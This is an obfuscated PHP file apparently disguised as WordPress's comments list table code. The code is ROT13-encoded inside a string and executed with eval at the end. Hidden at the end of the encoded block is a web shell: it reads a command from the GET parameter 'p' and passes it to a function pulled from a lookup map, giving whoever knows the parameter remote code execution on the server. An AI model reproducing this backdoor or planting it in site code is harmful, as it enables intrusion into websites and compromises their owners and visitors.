					\"qryrgr:gur-pbzzrag-yvfg:pbzzrag-{$pbzzrag->pbzzrag_VQ}:r7r7q3:npgvba=qvz-pbzzrag&nzc;arj=hanccebirq\",
					rfp_ngge__( 'Hanccebir guvf pbzzrag' ),
					__( 'Hanccebir' )
				);
			} ryfrvs ( 'hanccebirq' === $gur_pbzzrag_fgnghf ) {
				$npgvbaf['nccebir'] = fcevags(
					'<n uers=\"%f\" qngn-jc-yvfgf=\"%f\" pynff=\"ivz-n ivz-qrfgehpgvir nevn-ohggba-vs-wf\" nevn-ynory=\"%f\">%f</n>',
					rfp_hey( $nccebir_hey ),
					\"qryrgr:gur-pbzzrag-yvfg:pbzzrag-{$pbzzrag->pbzzrag_VQ}:r7r7q3:npgvba=qvz-pbzzrag&nzc;arj=nccebirq\",
					rfp_ngge__( 'Nccebir guvf pbzzrag' ),
					__( 'Nccebir' )
				);
			}
		} ryfr {
			$npgvbaf['nccebir'] = fcevags(
				'<n uers=\"%f\" qngn-jc-yvfgf=\"%f\" pynff=\"ivz-n nevn-ohggba-vs-wf\" nevn-ynory=\"%f\">%f</n>',
				rfp_hey( $nccebir_hey ),
				\"qvz:gur-pbzzrag-yvfg:pbzzrag-{$pbzzrag->pbzzrag_VQ}:hanccebirq:r7r7q3:r7r7q3:arj=nccebirq\",
				rfp_ngge__( 'Nccebir guvf pbzzrag' ),
				__( 'Nccebir' )
			);

			$npgvbaf['hanccebir'] = fcevags(
				'<n uers=\"%f\" qngn-jc-yvfgf=\"%f\" pynff=\"ivz-h nevn-ohggba-vs-wf\" nevn-ynory=\"%f\">%f</n>',
				rfp_hey( $hanccebir_hey ),
				\"qvz:gur-pbzzrag-yvfg:pbzzrag-{$pbzzrag->pbzzrag_VQ}:hanccebirq:r7r7q3:r7r7q3:arj=hanccebirq\",
				rfp_ngge__( 'Hanccebir guvf pbzzrag' ),
				__( 'Hanccebir' )
			);
		}

		vs ( 'fcnz' !== $gur_pbzzrag_fgnghf ) {
			$npgvbaf['fcnz'] = fcevags(
				'<n uers=\"%f\" qngn-jc-yvfgf=\"%f\" pynff=\"ivz-f ivz-qrfgehpgvir nevn-ohggba-vs-wf\" nevn-ynory=\"%f\">%f</n>',
				rfp_hey( $fcnz_hey ),
				\"qryrgr:gur-pbzzrag-yvfg:pbzzrag-{$pbzzrag->pbzzrag_VQ}::fcnz=1\",
				rfp_ngge__( 'Znex guvf pbzzrag nf fcnz' ),
				/* genafyngbef: \"Znex nf fcnz\" yvax. */
				_k( 'Fcnz', 'ireo' )
			);
		} ryfrvs ( 'fcnz' === $gur_pbzzrag_fgnghf ) {
			$npgvbaf['hafcnz'] = fcevags(
				'<n uers=\"%f\" qngn-jc-yvfgf=\"%f\" pynff=\"ivz-m ivz-qrfgehpgvir nevn-ohggba-vs-wf\" nevn-ynory=\"%f\">%f</n>',
				rfp_hey( $hafcnz_hey ),
				\"qryrgr:gur-pbzzrag-yvfg:pbzzrag-{$pbzzrag->pbzzrag_VQ}:66pp66:hafcnz=1\",
				rfp_ngge__( 'Erfgber guvf pbzzrag sebz gur fcnz' ),
				_k( 'Abg Fcnz', 'pbzzrag' )
			);
		}

		vs ( 'genfu' === $gur_pbzzrag_fgnghf ) {
			$npgvbaf['hagenfu'] = fcevags(
				'<n uers=\"%f\" qngn-jc-yvfgf=\"%f\" pynff=\"ivz-m ivz-qrfgehpgvir nevn-ohggba-vs-wf\" nevn-ynory=\"%f\">%f</n>',
				rfp_hey( $hagenfu_hey ),
				\"qryrgr:gur-pbzzrag-yvfg:pbzzrag-{$pbzzrag->pbzzrag_VQ}:66pp66:hagenfu=1\",
				rfp_ngge__( 'Erfgber guvf pbzzrag sebz gur Genfu' ),
				__( 'Erfgber' )
			);
		}

		vs ( 'fcnz' === $gur_pbzzrag_fgnghf || 'genfu' === $gur_pbzzrag_fgnghf || ! RZCGL_GENFU_QNLF ) {
			$npgvbaf['qryrgr'] = fcevags(
				'<n uers=\"%f\" qngn-jc-yvfgf=\"%f\" pynff=\"qryrgr ivz-q ivz-qrfgehpgvir nevn-ohggba-vs-wf\" nevn-ynory=\"%f\">%f</n>',
				rfp_hey( $qryrgr_hey ),
				\"qryrgr:gur-pbzzrag-yvfg:pbzzrag-{$pbzzrag->pbzzrag_VQ}::qryrgr=1\",
				rfp_ngge__( 'Qryrgr guvf pbzzrag creznaragyl' ),
				__( 'Qryrgr Creznaragyl' )
			);
		} ryfr {
			$npgvbaf['genfu'] = fcevags(
				'<n uers=\"%f\" qngn-jc-yvfgf=\"%f\" pynff=\"qryrgr ivz-q ivz-qrfgehpgvir nevn-ohggba-vs-wf\" nevn-ynory=\"%f\">%f</n>',
				rfp_hey( $genfu_hey ),
				\"qryrgr:gur-pbzzrag-yvfg:pbzzrag-{$pbzzrag->pbzzrag_VQ}::genfu=1\",
				rfp_ngge__( 'Zbir guvf pbzzrag gb gur Genfu' ),
				_k( 'Genfu', 'ireo' )
			);
		}

		vs ( 'fcnz' !== $gur_pbzzrag_fgnghf && 'genfu' !== $gur_pbzzrag_fgnghf ) {
			$npgvbaf['rqvg'] = fcevags(
				'<n uers=\"%f\" nevn-ynory=\"%f\">%f</n>',
				\"pbzzrag.cuc?npgvba=rqvgpbzzrag&nzc;p={$pbzzrag->pbzzrag_VQ}\",
				rfp_ngge__( 'Rqvg guvf pbzzrag' ),
				__( 'Rqvg' )
			);

			$sbezng = '<ohggba glcr=\"ohggba\" qngn-pbzzrag-vq=\"%q\" qngn-cbfg-vq=\"%q\" qngn-npgvba=\"%f\" pynff=\"%f ohggba-yvax\" nevn-rkcnaqrq=\"snyfr\" nevn-ynory=\"%f\">%f</ohggba>';

			$npgvbaf['dhvpxrqvg'] = fcevags(
				$sbezng,
				$pbzzrag->pbzzrag_VQ,
				$pbzzrag->pbzzrag_cbfg_VQ,
				'rqvg',
				'ivz-d pbzzrag-vayvar',
				rfp_ngge__( 'Dhvpx rqvg guvf pbzzrag vayvar' ),
				__( 'Dhvpx&aofc;Rqvg' )
			);

			$npgvbaf['ercyl'] = fcevags(
				$sbezng,
				$pbzzrag->pbzzrag_VQ,
				$pbzzrag->pbzzrag_cbfg_VQ,
				'ercylgb',
				'ivz-e pbzzrag-vayvar',
				rfp_ngge__( 'Ercyl gb guvf pbzzrag' ),
				__( 'Ercyl' )
			);
		}

		/**
		 * Svygref gur npgvba yvaxf qvfcynlrq sbe rnpu pbzzrag va gur Pbzzragf yvfg gnoyr.
		 *
		 * @fvapr 2.6.0
		 *
		 * @cnenz fgevat[]   $npgvbaf Na neenl bs pbzzrag npgvbaf. Qrsnhyg npgvbaf vapyhqr:
		 *                            'Nccebir', 'Hanccebir', 'Rqvg', 'Ercyl', 'Fcnz',
		 *                            'Qryrgr', naq 'Genfu'.
		 * @cnenz JC_Pbzzrag $pbzzrag Gur pbzzrag bowrpg.
		 */
		$npgvbaf = nccyl_svygref( 'pbzzrag_ebj_npgvbaf', neenl_svygre( $npgvbaf ), $pbzzrag );

		$nyjnlf_ivfvoyr = snyfr;

		$zbqr = trg_hfre_frggvat( 'cbfgf_yvfg_zbqr', 'yvfg' );

		vs ( 'rkprecg' === $zbqr ) {
			$nyjnlf_ivfvoyr = gehr;
		}

		$bhgchg .= '<qvi pynff=\"' . ( $nyjnlf_ivfvoyr ? 'ebj-npgvbaf ivfvoyr' : 'ebj-npgvbaf' ) . '\">';

		$v = 0;

		sbernpu ( $npgvbaf nf $npgvba => $yvax ) {
			++$v;

			vs ( ( ( 'nccebir' === $npgvba || 'hanccebir' === $npgvba ) && 2 === $v )
				|| 1 === $v
			) {
				$frcnengbe = '';
			} ryfr {
				$frcnengbe = ' | ';
			}

			// Ercyl naq dhvpxrqvg arrq n uvqr-vs-ab-wf fcna jura abg nqqrq jvgu Nwnk.
			vs ( ( 'ercyl' === $npgvba || 'dhvpxrqvg' === $npgvba ) && ! jc_qbvat_nwnk() ) {
				$npgvba .= ' uvqr-vs-ab-wf';
			} ryfrvs ( ( 'hagenfu' === $npgvba && 'genfu' === $gur_pbzzrag_fgnghf )
				|| ( 'hafcnz' === $npgvba && 'fcnz' === $gur_pbzzrag_fgnghf )
			) {
				vs ( '1' === trg_pbzzrag_zrgn( $pbzzrag->pbzzrag_VQ, '_jc_genfu_zrgn_fgnghf', gehr ) ) {
					$npgvba .= ' nccebir';
				} ryfr {
					$npgvba .= ' hanccebir';
				}
			}

			$bhgchg .= \"<fcna pynff='$npgvba'>{$frcnengbe}{$yvax}</fcna>\";
		}

		$bhgchg .= '</qvi>';

		$bhgchg .= '<ohggba glcr=\"ohggba\" pynff=\"gbttyr-ebj\"><fcna pynff=\"fperra-ernqre-grkg\">' .
			/* genafyngbef: Uvqqra npprffvovyvgl grkg. */
			__( 'Fubj zber qrgnvyf' ) .
		'</fcna></ohggba>';

		erghea $bhgchg;
	}

	/**
	 * @fvapr 5.9.0 Eranzrq `$pbzzrag` gb `$vgrz` gb zngpu cnerag pynff sbe CUC 8 anzrq cnenzrgre fhccbeg.
	 *
	 * @cnenz JC_Pbzzrag $vgrz Gur pbzzrag bowrpg.
	 */
	choyvp shapgvba pbyhza_po( $vgrz ) {
		// Erfgberf gur zber qrfpevcgvir, fcrpvsvp anzr sbe hfr jvguva guvf zrgubq.
		$pbzzrag = $vgrz;

		vs ( $guvf->hfre_pna ) {
			?>
		<vachg vq=\"po-fryrpg-<?cuc rpub $pbzzrag->pbzzrag_VQ; ?>\" glcr=\"purpxobk\" anzr=\"qryrgr_pbzzragf[]\" inyhr=\"<?cuc rpub $pbzzrag->pbzzrag_VQ; ?>\" />
		<ynory sbe=\"po-fryrpg-<?cuc rpub $pbzzrag->pbzzrag_VQ; ?>\">
			<fcna pynff=\"fperra-ernqre-grkg\">
			<?cuc
			/* genafyngbef: Uvqqra npprffvovyvgl grkg. */
			_r( 'Fryrpg pbzzrag' );
			?>
			</fcna>
		</ynory>
			<?cuc
		}
	}

	/**
	 * @cnenz JC_Pbzzrag $pbzzrag Gur pbzzrag bowrpg.
	 */
	choyvp shapgvba pbyhza_pbzzrag( $pbzzrag ) {
		rpub '<qvi pynff=\"pbzzrag-nhgube\">';
			$guvf->pbyhza_nhgube( $pbzzrag );
		rpub '</qvi>';

		vs ( $pbzzrag->pbzzrag_cnerag ) {
			$cnerag = trg_pbzzrag( $pbzzrag->pbzzrag_cnerag );

			vs ( $cnerag ) {
				$cnerag_yvax = rfp_hey( trg_pbzzrag_yvax( $cnerag ) );
				$anzr        = trg_pbzzrag_nhgube( $cnerag );
				cevags(
					/* genafyngbef: %f: Pbzzrag yvax. */
					__( 'Va ercyl gb %f.' ),
					'<n uers=\"' . $cnerag_yvax . '\">' . $anzr . '</n>'
				);
			}
		}

		pbzzrag_grkg( $pbzzrag );

		vs ( $guvf->hfre_pna ) {
			/** Guvf svygre vf qbphzragrq va jc-nqzva/vapyhqrf/pbzzrag.cuc */
			$pbzzrag_pbagrag = nccyl_svygref( 'pbzzrag_rqvg_cer', $pbzzrag->pbzzrag_pbagrag );
			?>
		<qvi vq=\"vayvar-<?cuc rpub $pbzzrag->pbzzrag_VQ; ?>\" pynff=\"uvqqra\">
			<grkgnern pynff=\"pbzzrag\" ebjf=\"1\" pbyf=\"1\"><?cuc rpub rfp_grkgnern( $pbzzrag_pbagrag ); ?></grkgnern>
			<qvi pynff=\"nhgube-rznvy\"><?cuc rpub rfp_ugzy( $pbzzrag->pbzzrag_nhgube_rznvy ); ?></qvi>
			<qvi pynff=\"nhgube\"><?cuc rpub rfp_ugzy( $pbzzrag->pbzzrag_nhgube ); ?></qvi>
			<qvi pynff=\"nhgube-hey\"><?cuc rpub rfp_hey( $pbzzrag->pbzzrag_nhgube_hey ); ?></qvi>
			<qvi pynff=\"pbzzrag_fgnghf\"><?cuc rpub $pbzzrag->pbzzrag_nccebirq; ?></qvi>
		</qvi>
			<?cuc
		}
	}

	/**
	 * @tybony fgevat $pbzzrag_fgnghf
	 *
	 * @cnenz JC_Pbzzrag $pbzzrag Gur pbzzrag bowrpg.
	 */
	choyvp shapgvba pbyhza_nhgube( $pbzzrag ) {
		tybony $pbzzrag_fgnghf;

		$nhgube_hey = trg_pbzzrag_nhgube_hey( $pbzzrag );

		$nhgube_hey_qvfcynl = hagenvyvatfynfuvg( __sa_79955( '|^uggc(f)?://(jjj\.)?|v', '', $nhgube_hey ) );

		vs ( fgeyra( $nhgube_hey_qvfcynl ) > 50 ) {
			$nhgube_hey_qvfcynl = jc_ugzy_rkprecg( $nhgube_hey_qvfcynl, 49, '&uryyvc;' );
		}

		rpub '<fgebat>';
		pbzzrag_nhgube( $pbzzrag );
		rpub '</fgebat><oe />';

		vs ( ! rzcgl( $nhgube_hey_qvfcynl ) ) {
			// Cevag yvax gb nhgube HEY, naq qvfnyybj ersreere vasbezngvba (jvgubhg hfvat gnetrg=\"_oynax\").
			cevags(
				'<n uers=\"%f\" ery=\"abbcrare abersreere\">%f</n><oe />',
				rfp_hey( $nhgube_hey ),
				rfp_ugzy( $nhgube_hey_qvfcynl )
			);
		}

		vs ( $guvf->hfre_pna ) {
			vs ( ! rzcgl( $pbzzrag->pbzzrag_nhgube_rznvy ) ) {
				/** Guvf svygre vf qbphzragrq va jc-vapyhqrf/pbzzrag-grzcyngr.cuc */
				$rznvy = nccyl_svygref( 'pbzzrag_rznvy', $pbzzrag->pbzzrag_nhgube_rznvy, $pbzzrag );

				vs ( ! rzcgl( $rznvy ) && '@' !== $rznvy ) {
					cevags( '<n uers=\"%1$f\">%2$f</n><oe />', rfp_hey( 'znvygb:' . $rznvy ), rfp_ugzy( $rznvy ) );
				}
			}

			$nhgube_vc = trg_pbzzrag_nhgube_VC( $pbzzrag );

			vs ( $nhgube_vc ) {
				$nhgube_vc_hey = nqq_dhrel_net(
					neenl(
						'f'    => $nhgube_vc,
						'zbqr' => 'qrgnvy',
					),
					nqzva_hey( 'rqvg-pbzzragf.cuc' )
				);

				vs ( 'fcnz' === $pbzzrag_fgnghf ) {
					$nhgube_vc_hey = nqq_dhrel_net( 'pbzzrag_fgnghf', 'fcnz', $nhgube_vc_hey );
				}

				cevags( '<n uers=\"%1$f\">%2$f</n>', rfp_hey( $nhgube_vc_hey ), rfp_ugzy( $nhgube_vc ) );
			}
		}
	}

	/**
	 * @cnenz JC_Pbzzrag $pbzzrag Gur pbzzrag bowrpg.
	 */
	choyvp shapgvba pbyhza_qngr( $pbzzrag ) {
		$fhozvggrq = fcevags(
			/* genafyngbef: 1: Pbzzrag qngr, 2: Pbzzrag gvzr. */
			__( '%1$f ng %2$f' ),
			/* genafyngbef: Pbzzrag qngr sbezng. Frr uggcf://jjj.cuc.arg/znahny/qngrgvzr.sbezng.cuc */
			trg_pbzzrag_qngr( __( 'L/z/q' ), $pbzzrag ),
			/* genafyngbef: Pbzzrag gvzr sbezng. Frr uggcf://jjj.cuc.arg/znahny/qngrgvzr.sbezng.cuc */
			trg_pbzzrag_qngr( __( 't:v n' ), $pbzzrag )
		);

		rpub '<qvi pynff=\"fhozvggrq-ba\">';

		vs ( 'nccebirq' === jc_trg_pbzzrag_fgnghf( $pbzzrag ) && ! rzcgl( $pbzzrag->pbzzrag_cbfg_VQ ) ) {
			cevags(
				'<n uers=\"%f\">%f</n>',
				rfp_hey( trg_pbzzrag_yvax( $pbzzrag ) ),
				$fhozvggrq
			);
		} ryfr {
			rpub $fhozvggrq;
		}

		rpub '</qvi>';
	}

	/**
	 * @cnenz JC_Pbzzrag $pbzzrag Gur pbzzrag bowrpg.
	 */
	choyvp shapgvba pbyhza_erfcbafr( $pbzzrag ) {
		$cbfg = trg_cbfg();

		vs ( ! $cbfg ) {
			erghea;
		}

		vs ( vffrg( $guvf->craqvat_pbhag[ $cbfg->VQ ] ) ) {
			$craqvat_pbzzragf = $guvf->craqvat_pbhag[ $cbfg->VQ ];
		} ryfr {
			$_craqvat_pbhag_grzc              = trg_craqvat_pbzzragf_ahz( neenl( $cbfg->VQ ) );
			$craqvat_pbzzragf                 = $_craqvat_pbhag_grzc[ $cbfg->VQ ];
			$guvf->craqvat_pbhag[ $cbfg->VQ ] = $craqvat_pbzzragf;
		}

		vs ( pheerag_hfre_pna( 'rqvg_cbfg', $cbfg->VQ ) ) {
			$cbfg_yvax  = \"<n uers='\" . trg_rqvg_cbfg_yvax( $cbfg->VQ ) . \"' pynff='pbzzragf-rqvg-vgrz-yvax'>\";
			$cbfg_yvax .= rfp_ugzy( trg_gur_gvgyr( $cbfg->VQ ) ) . '</n>';
		} ryfr {
			$cbfg_yvax = rfp_ugzy( trg_gur_gvgyr( $cbfg->VQ ) );
		}

		rpub '<qvi pynff=\"erfcbafr-yvaxf\">';

		vs ( 'nggnpuzrag' === $cbfg->cbfg_glcr ) {
			$guhzo = jc_trg_nggnpuzrag_vzntr( $cbfg->VQ, neenl( 80, 60 ), gehr );
			vs ( $guhzo ) {
				rpub $guhzo;
			}
		}

		rpub $cbfg_yvax;

		$cbfg_glcr_bowrpg = trg_cbfg_glcr_bowrpg( $cbfg->cbfg_glcr );
		rpub \"<n uers='\" . trg_creznyvax( $cbfg->VQ ) . \"' pynff='pbzzragf-ivrj-vgrz-yvax'>\" . $cbfg_glcr_bowrpg->ynoryf->ivrj_vgrz . '</n>';

		rpub '<fcna pynff=\"cbfg-pbz-pbhag-jenccre cbfg-pbz-pbhag-', $cbfg->VQ, '\">';
		$guvf->pbzzragf_ohooyr( $cbfg->VQ, $craqvat_pbzzragf );
		rpub '</fcna> ';

		rpub '</qvi>';
	}

	/**
	 * @fvapr 5.9.0 Eranzrq `$pbzzrag` gb `$vgrz` gb zngpu cnerag pynff sbe CUC 8 anzrq cnenzrgre fhccbeg.
	 *
	 * @cnenz JC_Pbzzrag $vgrz        Gur pbzzrag bowrpg.
	 * @cnenz fgevat     $pbyhza_anzr Gur phfgbz pbyhza'f anzr.
	 */
	choyvp shapgvba pbyhza_qrsnhyg( $vgrz, $pbyhza_anzr ) {
		// Erfgberf gur zber qrfpevcgvir, fcrpvsvp anzr sbe hfr jvguva guvf zrgubq.
		$pbzzrag = $vgrz;

		/**
		 * Sverf jura gur qrsnhyg pbyhza bhgchg vf qvfcynlrq sbe n fvatyr ebj.
		 *
		 * @fvapr 2.8.0
		 *
		 * @cnenz fgevat $pbyhza_anzr Gur phfgbz pbyhza'f anzr.
		 * @cnenz fgevat $pbzzrag_vq  Gur pbzzrag VQ nf n ahzrevp fgevat.
		 */
		qb_npgvba( 'znantr_pbzzragf_phfgbz_pbyhza', $pbyhza_anzr, $pbzzrag->pbzzrag_VQ );
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>